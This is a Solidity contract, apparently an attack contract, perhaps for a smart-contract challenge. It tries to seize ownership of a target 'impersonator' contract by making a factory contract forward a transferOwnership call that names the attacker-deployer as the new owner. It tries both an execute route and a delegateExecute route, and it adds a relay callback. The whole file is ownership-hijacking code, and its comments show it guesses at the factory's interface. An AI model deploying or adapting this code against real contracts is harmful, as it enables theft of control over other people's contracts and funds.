// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IFactory {
    // Common patterns in factory contracts
    function owner() external view returns (address);
    function execute(address target, bytes calldata data) external;
    function delegateExecute(address target, bytes calldata data) external;
}

interface IImpersonator {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
}

contract FactoryImpersonator {
    address public immutable impersonator;
    address public immutable factory;
    address public immutable deployer;
    
    constructor(address _impersonator, address _factory) {
        impersonator = _impersonator;
        factory = _factory;
        deployer = msg.sender;
    }
    
    // Try to make factory execute transferOwnership
    function tryExecute() external {
        bytes memory data = abi.encodeWithSignature("transferOwnership(address)", deployer);
        try IFactory(factory).execute(impersonator, data) {
            // Success
        } catch {
            // Failed
        }
    }
    
    // Try delegatecall approach
    function tryDelegate() external {
        bytes memory data = abi.encodeWithSignature("transferOwnership(address)", deployer);
        try IFactory(factory).delegateExecute(impersonator, data) {
            // Success
        } catch {
            // Failed
        }
    }
    
    // Callback that factory might call
    function transferOwnership(address newOwner) external {
        require(msg.sender == factory, "Only factory");
        IImpersonator(impersonator).transferOwnership(newOwner);
    }
}